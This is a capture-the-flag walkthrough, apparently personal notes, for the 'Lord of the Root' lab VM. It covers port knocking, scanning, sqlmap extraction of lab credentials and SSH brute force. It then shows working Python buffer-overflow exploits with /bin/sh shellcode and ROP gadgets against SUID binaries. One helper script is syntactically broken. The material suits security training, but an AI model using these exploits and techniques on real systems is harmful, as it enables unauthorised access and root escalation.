https://kooksec.blogspot.com/2015/09/hacking-lord-of-root.html


```console
└─$ sudo nmap -sT -A -Pn -n -p- 192.168.110.36
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-05 11:32 CEST
Nmap scan report for 192.168.110.36
Host is up (0.00070s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 3c:3d:e3:8e:35:f9:da:74:20:ef:aa:49:4a:1d:ed:dd (DSA)
|   2048 85:94:6c:87:c9:a8:35:0f:2c:db:bb:c1:3f:2a:50:c1 (RSA)
|   256 f3:cd:aa:1d:05:f2:1e:8c:61:87:25:b6:f4:34:45:37 (ECDSA)
|_  256 34:ec:16:dd:a7:cf:2a:86:45:ec:65:ea:05:43:89:21 (ED25519)
MAC Address: 08:00:27:DB:09:94 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11, Linux 3.16 - 4.6, Linux 3.2 - 4.9, Linux 4.4
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.70 ms 192.168.110.36

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 106.84 seconds
```

```console
┌──(kali㉿kali)-[~/OSCP/boxes/lord]
└─$ ssh 192.168.110.36                   
The authenticity of host '192.168.110.36 (192.168.110.36)' can't be established.
ECDSA key fingerprint is SHA256:XzDLUMxo8ifHi4SciYJYj702X3PfFwaXyKOS07b6xd8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.110.36' (ECDSA) to the list of known hosts.

                                                  .____    _____________________________
                                                  |    |   \_____  \__    ___/\______   \
                                                  |    |    /   |   \|    |    |       _/
                                                  |    |___/    |    \    |    |    |   \
                                                  |_______ \_______  /____|    |____|_  /
                                                          \/       \/                 \/
 ____  __.                     __     ___________      .__                   .___ ___________      ___________       __
|    |/ _| ____   ____   ____ |  | __ \_   _____/______|__| ____   ____    __| _/ \__    ___/___   \_   _____/ _____/  |_  ___________
|      <  /    \ /  _ \_/ ___\|  |/ /  |    __) \_  __ \  |/ __ \ /    \  / __ |    |    | /  _ \   |    __)_ /    \   __\/ __ \_  __ \
|    |  \|   |  (  <_> )  \___|    <   |     \   |  | \/  \  ___/|   |  \/ /_/ |    |    |(  <_> )  |        \   |  \  | \  ___/|  | \/
|____|__ \___|  /\____/ \___  >__|_ \  \___  /   |__|  |__|\___  >___|  /\____ |    |____| \____/  /_______  /___|  /__|  \___  >__|
        \/    \/            \/     \/      \/                  \/     \/      \/                           \/     \/          \/
Easy as 1,2,3
bttai@192.168.110.36's password: 

```


```bash

for x in 1 2 3; do nmap -Pn --host-timeout 201 --max-retries 0 -p $x 192.168.110.36; done

```


```console
└─$ sudo nmap -sT -A -Pn -n -p- 192.168.110.36                         
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-05 11:42 CEST
Nmap scan report for 192.168.110.36
Host is up (0.00074s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 3c:3d:e3:8e:35:f9:da:74:20:ef:aa:49:4a:1d:ed:dd (DSA)
|   2048 85:94:6c:87:c9:a8:35:0f:2c:db:bb:c1:3f:2a:50:c1 (RSA)
|   256 f3:cd:aa:1d:05:f2:1e:8c:61:87:25:b6:f4:34:45:37 (ECDSA)
|_  256 34:ec:16:dd:a7:cf:2a:86:45:ec:65:ea:05:43:89:21 (ED25519)
1337/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:DB:09:94 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11, Linux 3.16 - 4.6, Linux 3.2 - 4.9, Linux 4.4
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.74 ms 192.168.110.36

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 117.90 seconds
```

```console

┌──(kali㉿kali)-[~/OSCP/boxes/lord]
└─$ curl http://192.168.110.36:1337/404.html
<html>
<img src="/images/hipster.jpg" align="middle">
<!--THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh>
</html>
                                                                                                                                                             
┌──(kali㉿kali)-[~/OSCP/boxes/lord]
└─$ echo THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh | base64 -d
Lzk3ODM0NTIxMC9pbmRleC5waHA= Closer!                                                                                                                                                             
┌──(kali㉿kali)-[~/OSCP/boxes/lord]
└─$ echo Lzk3ODM0NTIxMC9pbmRleC5waHA= | base64 -d                    
/978345210/index.php 

```

```console

└─$ sqlmap -u 'http://192.168.110.36:1337/978345210/index.php' --forms --dbms=Mysql --risk=3 --level=5 --threads=4 --batch  --dbs
[15:57:41] [INFO] retrieved: performance_schema
available databases [4]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] Webapp


└─$ sqlmap -u 'http://192.168.110.36:1337/978345210/index.php' --forms --dbms=Mysql --risk=3 --level=5 --threads=4 --batch  -D Webapp -T Users --dump

+----+------------------+----------+
| id | password         | username |
+----+------------------+----------+
| 1  | iwilltakethering | frodo    |
| 2  | MyPreciousR00t   | smeagol  |
| 3  | AndMySword       | aragorn  |
| 4  | AndMyBow         | legolas  |
| 5  | AndMyAxe         | gimli    |
+----+------------------+----------+
```



```console

└─$ hydra -L users.txt -P passwords.txt ssh://192.168.110.36               
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-05 16:15:10
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 36 login tries (l:6/p:6), ~3 tries per task
[DATA] attacking ssh://192.168.110.36:22/
[22][ssh] host: 192.168.110.36   login: smeagol   password: MyPreciousR00t
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-07-05 16:15:14
```


```console

smeagol@LordOfTheRoot:~$ find / -perm -u=s -type f 2>/dev/null
/SECRET/door2/file
/SECRET/door1/file
/SECRET/door3/file

```


```python

# cat exploit.py 

import struct

def p(x):
        return struct.pack('I', x)

trap = "\xcc"
nop = "\x90"
sc = ""
sc += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
sc += "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
sc += "\x80\xe8\xdc\xff\xff\xff/bin/sh"

buf = ""
buf += "A" *171
#buf += "B"* 4
buf += p(0xbf9a0650)
#buf += "C" * 200
#buf += trap * 200
buf += nop * (10240 -len(sc))

buf += sc

print buf

```




```bash

smeagol@LordOfTheRoot:~$ for a in {1..1000};do /SECRET/door2/file $(python exploit.py); done

```


```python
import os, sys


files = ["file1", "file2", "file3"]

while True:
    fileSize[]
    for f in files:
        fileSize.apped(os.path.getsize(f))
    index = fileSize.index(min(fileSize))
    os.system(files[index] + " " + exploit)
    #os.system("gdb --args " + files[index] + " " + exploit)

```

```c
# cat buf.c
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[]){

        char buff[159];
        if(argc <2){
                printf("Syntax: %s <input string>\n", argv[0]);
                exit (0);

        }
  strcpy(buff, argv[1]);
  return 0;

}
```

```c
# cat other.c
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[]){

        char buff[150];
        if(argc <2){
                printf("Syntax: %s <input string>\n", argv[0]);
                exit (0);

        }
  //This Program does nothing
  return 0;

}
```



```c
//
// This file was generated by the Retargetable Decompiler
// Website: https://retdec.com
// Copyright (c) Retargetable Decompiler <info@retdec.com>
//

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// ------------------------ Functions -------------------------

// Address range: 0x804845d - 0x80484af
int main(int argc, char ** argv) {
    if (argc > 1) {
        int32_t str2 = *(int32_t *)((int32_t)argv + 4); // 0x8048496
        int32_t str; // bp-175, 0x804845d
        strcpy((char *)&str, (char *)str2);
        return 0;
    }
    // 0x804846f
    printf("Syntax: %s <input string>\n", *argv);
    exit(0);
    // UNREACHABLE
}

// --------------- Dynamically Linked Functions ---------------

// void exit(int status);
// int printf(const char * restrict format, ...);
// char * strcpy(char * restrict dest, const char * restrict src);

// --------------------- Meta-Information ---------------------

// Detected compiler/packer: gcc (4.8.4)
// Detected functions: 1


```


```console

gdb-peda$ checksec 
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : disabled
gdb-peda$ vmmap 
Warning: not running
Start      End        Perm      Name
0x080482d4 0x08048538 rx-p      /SECRET/door1/file
0x08048134 0x08048638 r--p      /SECRET/door1/file
0x08049638 0x0804975c rw-p      /SECRET/door1/file


Breakpoint 1, 0x08048460 in main ()
gdb-peda$ ropgadget 
ret = 0x80482de
popret = 0x80482f5
pop4ret = 0x804850c
pop2ret = 0x804850e
pop3ret = 0x804850d
addesp_12 = 0x80482f2
addesp_44 = 0x8048509
gdb-peda$ p strcpy
$2 = {<text gnu-indirect-function variable, no debug info>} 0xb7e90650 <strcpy>
gdb-peda$ x/4i 0xb7e90650
   0xb7e90650 <strcpy>: push   ebx
   0xb7e90651 <strcpy+1>:       call   0xb7f3c94b <__x86.get_pc_thunk.bx>
   0xb7e90656 <strcpy+6>:       add    ebx,0x12f9aa
   0xb7e9065c <strcpy+12>:      cmp    DWORD PTR [ebx+0x3620],0x0



mprotect
        int mprotect(void *addr, size_t len, int prot);
strcpy 
        char *strcpy(char *dest, const char *src);
memcpy
       void *memcpy(void *dest, const void *src, size_t n);

0xb771b000 0xb771d000 r-xp      [vdso]



gdb-peda$ vmmap 
Start      End        Perm      Name
0x08048000 0x08049000 r-xp      /home/smeagol/file
0x08049000 0x0804a000 rwxp      /home/smeagol/file
0xb7555000 0xb7556000 rwxp      mapped
0xb7556000 0xb76fe000 r-xp      /lib/i386-linux-gnu/libc-2.19.so
0xb76fe000 0xb7700000 r-xp      /lib/i386-linux-gnu/libc-2.19.so
0xb7700000 0xb7701000 rwxp      /lib/i386-linux-gnu/libc-2.19.so
0xb7701000 0xb7704000 rwxp      mapped
0xb7718000 0xb771a000 rwxp      mapped
0xb771a000 0xb771c000 r--p      [vvar]
0xb771c000 0xb771e000 r-xp      [vdso]
0xb771e000 0xb773e000 r-xp      /lib/i386-linux-gnu/ld-2.19.so
0xb773e000 0xb773f000 r-xp      /lib/i386-linux-gnu/ld-2.19.so
0xb773f000 0xb7740000 rwxp      /lib/i386-linux-gnu/ld-2.19.so
0xbf980000 0xbf9a1000 rwxp      [stack]

```

===


http://barrebas.github.io/blog/2015/10/04/lord-of-the-root/


```console

Dump of assembler code for function main:
   0x0804845d <+0>:     push   ebp
   0x0804845e <+1>:     mov    ebp,esp
   0x08048460 <+3>:     and    esp,0xfffffff0
   0x08048463 <+6>:     sub    esp,0xb0
   0x08048469 <+12>:    cmp    DWORD PTR [ebp+0x8],0x1
   0x0804846d <+16>:    jg     0x8048490 <main+51>
   0x0804846f <+18>:    mov    eax,DWORD PTR [ebp+0xc]
   0x08048472 <+21>:    mov    eax,DWORD PTR [eax]
   0x08048474 <+23>:    mov    DWORD PTR [esp+0x4],eax
   0x08048478 <+27>:    mov    DWORD PTR [esp],0x8048540
   0x0804847f <+34>:    call   0x8048310 <printf@plt>
   0x08048484 <+39>:    mov    DWORD PTR [esp],0x0
   0x0804848b <+46>:    call   0x8048340 <exit@plt>
   0x08048490 <+51>:    mov    eax,DWORD PTR [ebp+0xc]
   0x08048493 <+54>:    add    eax,0x4
   0x08048496 <+57>:    mov    eax,DWORD PTR [eax]
   0x08048498 <+59>:    mov    DWORD PTR [esp+0x4],eax
   0x0804849c <+63>:    lea    eax,[esp+0x11]
   0x080484a0 <+67>:    mov    DWORD PTR [esp],eax
   0x080484a3 <+70>:    call   0x8048320 <strcpy@plt> <===
   0x080484a8 <+75>:    mov    eax,0x0
   0x080484ad <+80>:    leave  
   0x080484ae <+81>:    ret    
End of assembler dump.
gdb-peda$ x/5i 0x8048320
   0x8048320 <strcpy@plt>:      jmp    DWORD PTR ds:0x8049740
   0x8048326 <strcpy@plt+6>:    push   0x8
   0x804832b <strcpy@plt+11>:   jmp    0x8048300
   0x8048330 <__gmon_start__@plt>:      jmp    DWORD PTR ds:0x8049744
   0x8048336 <__gmon_start__@plt+6>:    push   0x10

gdb-peda$ x/16wx _start
0x8048360 <_start>:     0x895eed31      0xf0e483e1      0x68525450      0x08048520
0x8048370 <_start+16>:  0x0484b068      0x68565108      0x0804845d      0xffffcfe8
0x8048380 <_start+32>:  0x9066f4ff      0x90669066      0x90669066      0x90669066

```


```python


import struct

def p(x):
        return struct.pack('<L', x)



def write(what, where):
        # pop2ret = 0x804850e
        return p(0x8048326) + p(0x804850e) + p(where) + p(what)
buf = ""
buf += "A" * 171

sc = ""
sc += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68"
sc += "\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24"
sc += "\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd"
sc += "\x80\x31\xc0\xb0\x01\xcd\x80"


mem = 0x08049040


# e4ff
# x/16wx _start
buf += write(0x8048380, mem)    # 0x8048380 0x9066f4ff
#buf += write(0x8048366, mem+1) # 0x8048366 <_start+6>:   0x5450f0e4
buf += write(0x8048461, mem+1)  # 0x8048461 <main+4>:     0xec81f0e4

buf += p(mem)

buf += sc
print buf



```
